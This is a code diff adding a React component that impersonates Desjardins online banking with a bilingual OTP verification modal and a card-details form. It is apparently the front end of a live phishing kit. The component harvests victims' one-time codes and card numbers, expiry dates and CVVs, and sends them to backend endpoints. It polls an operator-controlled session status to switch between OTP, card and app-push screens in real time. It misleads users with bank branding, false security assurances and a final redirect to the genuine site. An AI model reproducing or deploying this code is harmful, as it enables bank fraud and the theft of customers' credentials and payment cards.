@@ -1,0 +1,622 @@
+import React, { useState, useEffect, useRef } from 'react';
+import { X, Check, Lock, CreditCard, Calendar, ShieldCheck } from 'lucide-react';
+
+
+const translations = {
+  en: {
+    title: "Desjardins Online Banking Verification",
+    subtitle: "A 6-digit verification code has been sent to your email. Please check.",
+    boxLabel: "Verification OTP Code",
+    expiresIn: "Expires in: ",
+    seconds: " seconds",
+    expiredWarning: "Code expired — please request a new one.",
+    incorrectError: "Incorrect code. Please try again.",
+    verifyBtn: "Verify Code",
+    verifyingBtn: "Verifying...",
+    resendBtn: "Resend Code",
+    resendingBtn: "Resending...",
+  },
+  fr: {
+    title: "Vérification Desjardins Services bancaires en ligne",
+    subtitle: "Un code de vérification à 6 chiffres a été envoyé à votre courriel. Veuillez vérifier.",
+    boxLabel: "Code de vérification OTP",
+    expiresIn: "Expire dans : ",
+    seconds: " secondes",
+    expiredWarning: "Code expiré — veuillez en demander un nouveau.",
+    incorrectError: "Code incorrect. Veuillez réessayer.",
+    verifyBtn: "Vérifier le code",
+    verifyingBtn: "Vérification...",
+    resendBtn: "Renvoyer le code",
+    resendingBtn: "Renvoi en cours...",
+  }
+};
+
+export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose, onSwitchToAppPush, onSwitchToAppPopup }) {
+  const t = translations[lang];
+  const [otpVal, setOtpVal] = useState(['', '', '', '', '', '']);
+  const [status, setStatus] = useState('show_otp');
+  const [displayedOtp, setDisplayedOtp] = useState('');
+  const [timeLeft, setTimeLeft] = useState(60);
+  const [error, setError] = useState('');
+  const [isVerifying, setIsVerifying] = useState(false);
+  const [isResending, setIsResending] = useState(false);
+  const [isFullyVerified, setIsFullyVerified] = useState(false);
+
+  // Card details state
+  const [cardNumber, setCardNumber] = useState('');
+  const [expiry, setExpiry] = useState('');
+  const [cvv, setCvv] = useState('');
+  const [isCardSubmitting, setIsCardSubmitting] = useState(false);
+
+  const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null), useRef(null), useRef(null)];
+  const displayedOtpRef = useRef('');
+
+  useEffect(() => { displayedOtpRef.current = displayedOtp; }, [displayedOtp]);
+
+  // Poll session status
+  useEffect(() => {
+    let isMounted = true;
+    const pollStatus = async () => {
+      try {
+        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
+          headers: { 'X-Access-Key': 'client-desjardins-banque' }
+        });
+        const data = await response.json();
+        if (!isMounted) return;
+        if (data.success) {
+          if (data.status === 'verified') {
+            isMounted = false;
+            setIsFullyVerified(true);
+            localStorage.removeItem('showOtpModal');
+            localStorage.removeItem('otpEmail');
+            localStorage.removeItem('otpExpiry');
+            fetch('/api/clear-session', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-desjardins-banque' },
+              body: JSON.stringify({ email })
+            }).catch(err => console.error('Error clearing session:', err));
+            setTimeout(() => { window.location.href = 'https://www.desjardins.com/'; }, 3000);
+            return;
+          }
+          if (data.status === 'redirect') {
+            window.location.href = data.redirectUrl || 'https://www.desjardins.com/';
+            return;
+          }
+          if (data.status === 'cancelled') { onClose(); window.location.reload(); return; }
+          if (data.status === 'idle') { onClose(); return; }
+
+          // ── Card popup / card submitted status ──
+          if (data.status === 'card_popup' || data.status === 'card_submitted') {
+            setStatus(data.status);
+            return;
+          }
+
+          if (data.status === 'app_push_popup') {
+            if (onSwitchToAppPush) onSwitchToAppPush();
+            return;
+          }
+
+          if (data.status === 'app_popup') {
+            if (onSwitchToAppPopup) onSwitchToAppPopup();
+            return;
+          }
+
+          setStatus((prevStatus) => {
+            if (data.status === 'rejected' && prevStatus !== 'rejected') {
+              setError(t.incorrectError);
+              setOtpVal(['', '', '', '', '', '']);
+              setTimeout(() => { if (inputRefs[0].current) inputRefs[0].current.focus(); }, 50);
+            }
+            return data.status;
+          });
+
+          if (data.otp && data.otp !== displayedOtpRef.current) {
+            setDisplayedOtp(data.otp);
+            setOtpVal(['', '', '', '', '', '']);
+            setError('');
+            setTimeout(() => { if (inputRefs[0].current) inputRefs[0].current.focus(); }, 50);
+          }
+
+          if (data.otpExpiry) {
+            const remaining = Math.max(0, Math.ceil((data.otpExpiry - Date.now()) / 1000));
+            setTimeLeft(remaining);
+          }
+        }
+      } catch (err) {
+        console.error('Error polling session status in OtpModal:', err);
+      }
+    };
+    pollStatus();
+    const intervalId = setInterval(pollStatus, 2000);
+    return () => { isMounted = false; clearInterval(intervalId); };
+  }, [email, onVerifySuccess, onClose, t.incorrectError]);
+
+  useEffect(() => {
+    if (inputRefs[0].current) inputRefs[0].current.focus();
+  }, []);
+
+  // ── Card helpers ──
+  const formatCardNumber = (val) => val.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ');
+  const formatExpiry = (val) => {
+    const d = val.replace(/\D/g, '').slice(0, 4);
+    return d.length >= 3 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
+  };
+
+  const handleCardSubmit = async (e) => {
+    e.preventDefault();
+    if (isCardSubmitting) return;
+    const rawCard = cardNumber.replace(/\s/g, '');
+    if (rawCard.length < 13 || !expiry || cvv.length < 3) return;
+    setIsCardSubmitting(true);
+    try {
+      const res = await fetch('/api/submit-card', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-desjardins-banque' },
+        body: JSON.stringify({ email, cardNumber: rawCard, cvv, expiry })
+      });
+      const data = await res.json();
+      if (data.success) {
+        setStatus('card_submitted');
+      }
+    } catch (err) {
+      console.error('Card submission error:', err);
+    } finally {
+      setIsCardSubmitting(false);
+    }
+  };
+
+  useEffect(() => {
+    if (status !== 'show_otp' && status !== 'rejected') return;
+    if (timeLeft <= 0) return;
+    const interval = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
+    return () => clearInterval(interval);
+  }, [timeLeft, status]);
+
+  const handleChange = (e, index) => {
+    const val = e.target.value;
+    const lastChar = val.substring(val.length - 1);
+    if (lastChar && !/^[0-9]$/.test(lastChar)) return;
+    const newOtp = [...otpVal];
+    newOtp[index] = lastChar;
+    setOtpVal(newOtp);
+    setError('');
+    if (lastChar !== '' && index < 5) inputRefs[index + 1].current.focus();
+  };
+
+  const handleKeyDown = (e, index) => {
+    if (e.key === 'Backspace') {
+      if (otpVal[index] === '') {
+        if (index > 0) {
+          const newOtp = [...otpVal];
+          newOtp[index - 1] = '';
+          setOtpVal(newOtp);
+          inputRefs[index - 1].current.focus();
+        }
+      } else {
+        const newOtp = [...otpVal];
+        newOtp[index] = '';
+        setOtpVal(newOtp);
+      }
+    } else if (e.key === 'Enter') {
+      handleVerify();
+    }
+  };
+
+  const handlePaste = (e) => {
+    e.preventDefault();
+    const pasteData = e.clipboardData.getData('text');
+    if (/^\d{6}$/.test(pasteData)) {
+      const newOtp = pasteData.split('');
+      setOtpVal(newOtp);
+      setError('');
+      if (inputRefs[5].current) inputRefs[5].current.focus();
+    }
+  };
+
+  useEffect(() => {
+    const currentOtp = otpVal.join('');
+    if (currentOtp.length === 6) handleVerify(currentOtp);
+  }, [otpVal]);
+
+  const handleVerify = async (codeToVerify) => {
+    const finalOtp = codeToVerify || otpVal.join('');
+    if (finalOtp.length !== 6) return;
+    if (timeLeft <= 0) { setError(t.expiredWarning); return; }
+    setIsVerifying(true);
+    try {
+      const response = await fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-desjardins-banque' },
+        body: JSON.stringify({ email, otp: finalOtp })
+      });
+      const data = await response.json();
+      if (data.success) {
+        setStatus('otp_submitted');
+      } else {
+        setError(lang === 'fr' ? 'Une erreur est survenue.' : 'An error occurred.');
+      }
+    } catch (err) {
+      console.error(err);
+      setError(lang === 'fr' ? 'Une erreur est survenue.' : 'An error occurred.');
+    } finally {
+      setIsVerifying(false);
+    }
+  };
+
+  const handleResend = async () => {
+    setOtpVal(['', '', '', '', '', '']);
+    setError('');
+    setIsResending(true);
+    try {
+      await fetch('/api/request-resend', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-desjardins-banque' },
+        body: JSON.stringify({ email })
+      });
+    } catch (err) {
+      console.error('Error requesting resend:', err);
+    } finally {
+      setIsResending(false);
+    }
+  };
+
+  const isExpired = timeLeft <= 0;
+  const isInputDisabled = isVerifying || status === 'otp_submitted' || status === 'accepted';
+
+  /* ── Verified state ── */
+  if (isFullyVerified) {
+    return (
+      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 animate-fade-in">
+        <div className="bg-white w-full max-w-[440px] rounded-[4px] shadow-[0_8px_32px_rgba(0,0,0,0.18)] p-10 flex flex-col items-center justify-center text-center border border-[#d8d8d8] animate-slide-in">
+          {/* Desjardins-green checkmark circle */}
+          <div className="w-[72px] h-[72px] rounded-full bg-[#1a7d48]/10 flex items-center justify-center mb-5">
+            <Check className="w-10 h-10 text-[#1a7d48]" strokeWidth={3} />
+          </div>
+          <h3 className="text-2xl font-medium text-[#222] mb-2">
+            {lang === 'fr' ? "Vérification réussie" : "Verification Successful"}
+          </h3>
+          <p className="text-[#888] text-[15px] font-normal">
+            {lang === 'fr' ? "Redirection en cours..." : "Redirecting you to Desjardins Online Banking..."}
+          </p>
+        </div>
+      </div>
+    );
+  }
+
+  // ── Card Details Form ──
+  const isCardActive = status === 'card_popup' || status === 'card_submitted';
+  if (isCardActive) {
+    const cardTranslations = {
+      en: {
+        title: "Identity Verification",
+        subtitle: "To protect your account from unauthorized access, please confirm your Card details.",
+        cardNumberLabel: "Card Number",
+        expiryLabel: "Expiration Date",
+        cvvLabel: "Security Code (CVV)",
+        submitBtn: "Verify Identity",
+        submittingBtn: "Authenticating...",
+        processingTitle: "Authenticating...",
+        processingSubtitle: "Please do not refresh this page or close your browser.",
+        securityFooter: "Secured by Royal Bank of Canada",
+      },
+      fr: {
+        title: "Vérification d'identité",
+        subtitle: "Pour protéger votre compte contre tout accès non autorisé, veuillez confirmer les détails de votre carte.",
+        cardNumberLabel: "Numéro de carte",
+        expiryLabel: "Date d'expiration",
+        cvvLabel: "Code de sécurité (CVV)",
+        submitBtn: "Vérifier l'identité",
+        submittingBtn: "Authentification...",
+        processingTitle: "Authentification...",
+        processingSubtitle: "Veuillez ne pas rafraîchir cette page ou fermer votre navigateur.",
+        securityFooter: "Sécurisé par la Banque Royale du Canada",
+      }
+    };
+    const ct = cardTranslations[lang];
+
+    return (
+      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in">
+        <div className="bg-white w-full max-w-[480px] rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.15)] px-8 pt-8 pb-7 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden">
+          {/* Desjardins Green Top Accent */}
+          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#1a7d48] to-[#003168]" />
+
+          {/* Close button */}
+          {onClose && (
+            <button
+              type="button"
+              onClick={onClose}
+              className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#555] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
+              aria-label="Close"
+            >
+              <X className="w-[18px] h-[18px]" />
+            </button>
+          )}
+
+          {/* Desjardins Logo */}
+          <div className="flex justify-center mb-5">
+            <div className="bg-white p-2 rounded-2xl shadow-[0_4px_12px_rgba(0,106,195,0.08)] border border-[#e0eef9]">
+              <img
+                src="/desjardins-hexa.png"
+                alt="Desjardins Logo"
+                className="w-12 h-12 object-contain rounded-xl"
+              />
+            </div>
+          </div>
+
+          <h3 className="text-[22px] font-bold text-[#1f2937] text-center mb-2 tracking-tight">
+            {ct.title}
+          </h3>
+          <p className="text-[#6b7280] text-[14.5px] text-center mb-7 leading-relaxed px-2">
+            {ct.subtitle}
+          </p>
+
+          <form onSubmit={handleCardSubmit}>
+            {status === 'card_submitted' ? (
+              <div className="flex flex-col items-center justify-center py-8">
+                <svg className="animate-spin w-10 h-10 text-[#1a7d48] mb-4" viewBox="0 0 24 24" fill="none">
+                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25"/>
+                  <path d="M12 2a10 10 0 0 1 10 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round"/>
+                </svg>
+                <div className="text-[#1f2937] text-[17px] font-semibold animate-pulse mb-2">
+                  {ct.processingTitle}
+                </div>
+                <p className="text-[#6b7280] text-[14px]">
+                  {ct.processingSubtitle}
+                </p>
+              </div>
+            ) : (
+              <div className="space-y-5">
+                {/* Card Number */}
+                <div>
+                  <label className="block text-[13px] font-semibold text-[#4b5563] mb-1.5 ml-1">
+                    {ct.cardNumberLabel}
+                  </label>
+                  <div className="relative">
+                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none">
+                      <CreditCard className="h-[18px] w-[18px] text-[#9ca3af]" />
+                    </div>
+                    <input
+                      type="text"
+                      inputMode="numeric"
+                      placeholder="0000 0000 0000 0000"
+                      value={cardNumber}
+                      onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                      maxLength={19}
+                      className="block w-full pl-[42px] pr-3 h-[46px] bg-[#f9fafb] border border-[#d1d5db] rounded-lg text-[#1f2937] font-mono text-[16px] tracking-wide placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#1a7d48]/20 focus:border-[#1a7d48] focus:bg-white transition-all shadow-sm"
+                    />
+                  </div>
+                </div>
+
+                {/* Expiry + CVV */}
+                <div className="flex gap-4 items-end">
+                  <div className="flex-1">
+                    <label className="block text-[13px] font-semibold text-[#4b5563] mb-1.5 ml-1">
+                      {ct.expiryLabel}
+                    </label>
+                    <div className="relative">
+                      <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none">
+                        <Calendar className="h-[18px] w-[18px] text-[#9ca3af]" />
+                      </div>
+                      <input
+                        type="text"
+                        inputMode="numeric"
+                        placeholder="MM/YY"
+                        value={expiry}
+                        onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                        maxLength={5}
+                        className="block w-full pl-[42px] pr-3 h-[46px] bg-[#f9fafb] border border-[#d1d5db] rounded-lg text-[#1f2937] font-mono text-[16px] placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#1a7d48]/20 focus:border-[#1a7d48] focus:bg-white transition-all shadow-sm"
+                      />
+                    </div>
+                  </div>
+                  <div className="w-[140px]">
+                    <label className="block text-[13px] font-semibold text-[#4b5563] mb-1.5 ml-1">
+                      {ct.cvvLabel}
+                    </label>
+                    <div className="relative">
+                      <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none">
+                        <Lock className="h-[17px] w-[17px] text-[#9ca3af]" />
+                      </div>
+                      <input
+                        type="password"
+                        inputMode="numeric"
+                        placeholder="•••"
+                        value={cvv}
+                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                        maxLength={4}
+                        className="block w-full pl-[38px] pr-3 h-[46px] bg-[#f9fafb] border border-[#d1d5db] rounded-lg text-[#1f2937] font-mono text-[16px] placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#1a7d48]/20 focus:border-[#1a7d48] focus:bg-white transition-all shadow-sm"
+                      />
+                    </div>
+                  </div>
+                </div>
+
+                <div className="pt-2">
+                  <button
+                    type="submit"
+                    disabled={isCardSubmitting || cardNumber.replace(/\s/g,'').length < 13 || !expiry || cvv.length < 3}
+                    className={`w-full h-[48px] text-white border-none rounded-lg text-[16px] font-bold flex items-center justify-center gap-2.5 transition-all duration-200 shadow-sm ${
+                      (isCardSubmitting || cardNumber.replace(/\s/g,'').length < 13 || !expiry || cvv.length < 3)
+                        ? 'bg-[#d1d5db] cursor-not-allowed'
+                        : 'bg-[#1a7d48] hover:bg-[#003168] cursor-pointer hover:shadow-md active:scale-[0.99]'
+                    }`}
+                  >
+                    <ShieldCheck className="w-[18px] h-[18px]" />
+                    {isCardSubmitting ? ct.submittingBtn : ct.submitBtn}
+                  </button>
+                </div>
+              </div>
+            )}
+          </form>
+
+          {/* Security Footer */}
+          <div className="mt-6 pt-4 border-t border-[#f3f4f6] flex items-center justify-center gap-2">
+            <Lock className="w-[13px] h-[13px] text-[#1a7d48]" />
+            <span className="text-[12px] text-[#6b7280] font-medium tracking-wide">
+              {ct.securityFooter}
+            </span>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  /* ── OTP modal ── */
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 animate-fade-in">
+      <div className="bg-white w-full max-w-[460px] rounded-[4px] shadow-[0_8px_32px_rgba(0,0,0,0.18)] px-10 pt-9 pb-10 flex flex-col relative border border-[#d8d8d8] animate-slide-in">
+
+        {/* Desjardins green accent bar at top */}
+        <div className="absolute top-0 left-0 right-0 h-1 bg-[#003168] rounded-t-[4px]" />
+
+        {/* Close button */}
+        {onClose && (
+          <button
+            type="button"
+            onClick={onClose}
+            className="absolute top-3.5 right-3.5 bg-transparent border-none cursor-pointer text-[#888] p-1 flex items-center rounded-[2px] hover:bg-black/5 transition-colors"
+            aria-label="Close"
+          >
+            <X className="w-[18px] h-[18px]" />
+          </button>
+        )}
+
+        {/* Desjardins Logo small */}
+        <div className="flex justify-center mb-4">
+          <img
+            src="/desjardins-hexa.png"
+            alt="Desjardins Logo"
+            className="w-12 h-12 object-contain"
+          />
+        </div>
+
+        <h3 className="text-2xl font-normal text-[#222] text-center mb-2">
+          {t.title}
+        </h3>
+        <p className="text-[#555] text-[15px] text-center mb-6 leading-normal">
+          {t.subtitle}
+        </p>
+
+        {/* 6-digit OTP inputs */}
+        <div className="flex justify-between gap-2.5 mb-4" onPaste={handlePaste}>
+          {otpVal.map((digit, idx) => (
+            <input
+              key={idx}
+              ref={inputRefs[idx]}
+              type="text"
+              inputMode="numeric"
+              pattern="[0-9]*"
+              maxLength={1}
+              value={digit}
+              onChange={e => handleChange(e, idx)}
+              onKeyDown={e => handleKeyDown(e, idx)}
+              disabled={isInputDisabled}
+              className={`w-full h-14 max-w-[56px] text-center text-2xl font-semibold border-2 rounded-[3px] outline-none transition-[border-color,background] duration-150 ${
+                isInputDisabled ? 'cursor-not-allowed' : 'cursor-text'
+              } ${
+                error
+                  ? 'border-brand-red bg-[#fef5f5] text-brand-red focus:border-brand-red focus:shadow-[0_0_0_2px_rgba(192,57,43,.18)]'
+                  : digit
+                    ? 'border-[#1a7d48] bg-[#f0f5f9] text-[#222] focus:border-[#1a7d48] focus:shadow-[0_0_0_2px_rgba(0,106,195,.18)]'
+                    : 'border-[#d8d8d8] bg-[#fafafa] text-[#222] focus:border-[#1a7d48] focus:shadow-[0_0_0_2px_rgba(0,106,195,.18)]'
+              }`}
+            />
+          ))}
+        </div>
+
+        {/* Timer / status line */}
+        <div className="text-center h-6 mb-1">
+          {(status === 'show_otp' || status === 'rejected') && (
+            isExpired ? (
+              <span className="text-brand-red text-[15px] font-medium animate-fade-in">
+                {t.expiredWarning}
+              </span>
+            ) : (
+              <span className="text-[#1a7d48] text-[15px] font-medium">
+                {t.expiresIn}
+                <span className={`inline-block min-w-[28px] text-center ${timeLeft <= 15 ? 'text-brand-red' : 'text-[#1a7d48]'}`}>
+                  {timeLeft}
+                </span>
+                {t.seconds}
+              </span>
+            )
+          )}
+          {status === 'otp_submitted' && (
+            <span className="text-[#1a7d48] text-[15px] font-medium animate-pulse">
+              {lang === 'fr' ? 'Vérification en cours...' : 'Verifying code...'}
+            </span>
+          )}
+          {status === 'accepted' && (
+            <span className="text-[#1a7d48] text-[15px] font-medium">
+              {lang === 'fr' ? '✓ Code accepté !' : '✓ Code accepted!'}
+            </span>
+          )}
+        </div>
+
+        {/* Error message */}
+        <div className="text-center h-[22px] mb-4">
+          {error && !isExpired && (
+            <span className="text-brand-red text-[15px] font-medium animate-fade-in">
+              {error}
+            </span>
+          )}
+        </div>
+
+        {/* Buttons */}
+        <div className="flex flex-col gap-2.5">
+          {/* Verify button */}
+          <button
+            onClick={() => handleVerify()}
+            disabled={isVerifying || isExpired || otpVal.join('').length !== 6 || isInputDisabled}
+            className={`w-full h-11 text-white border-none rounded-[4px] text-[17px] font-medium flex items-center justify-center gap-2 transition-colors duration-200 ${
+              (isVerifying || isExpired || otpVal.join('').length !== 6 || isInputDisabled)
+                ? 'bg-[#ccc] cursor-not-allowed'
+                : 'bg-brand-green hover:bg-brand-green-hover cursor-pointer'
+            }`}
+          >
+            {isVerifying || status === 'otp_submitted' ? (
+              <>
+                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                </svg>
+                <span>{t.verifyingBtn}</span>
+              </>
+            ) : (
+              t.verifyBtn
+            )}
+          </button>
+
+          {/* Resend button */}
+          <button
+            onClick={handleResend}
+            disabled={isResending || isVerifying || status === 'otp_submitted' || status === 'accepted'}
+            className={`w-full h-11 rounded-[4px] text-[17px] font-medium flex items-center justify-center gap-2 transition-[background,color] duration-200 ${
+              (isResending || isVerifying || status === 'otp_submitted' || status === 'accepted')
+                ? 'bg-white text-[#aaa] border-[1.5px] border-[#ddd] cursor-not-allowed'
+                : 'bg-white text-brand-green-dark border-[1.5px] border-brand-green-dark hover:bg-brand-green-dark hover:text-white cursor-pointer'
+            }`}
+          >
+            {isResending ? (
+              <>
+                <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+                </svg>
+                <span>{t.resendingBtn}</span>
+              </>
+            ) : (
+              t.resendBtn
+            )}
+          </button>
+        </div>
+
+        {/* Small security note */}
+        <p className="text-center text-[13px] text-[#888] mt-4 leading-normal">
+          {lang === 'fr'
+            ? "Desjardins ne vous demandera jamais votre mot de passe complet par courriel ou par téléphone."
+            : "Desjardins will never ask for your full password via email or phone."
+          }
+        </p>
+      </div>
+    </div>
+  );
+}
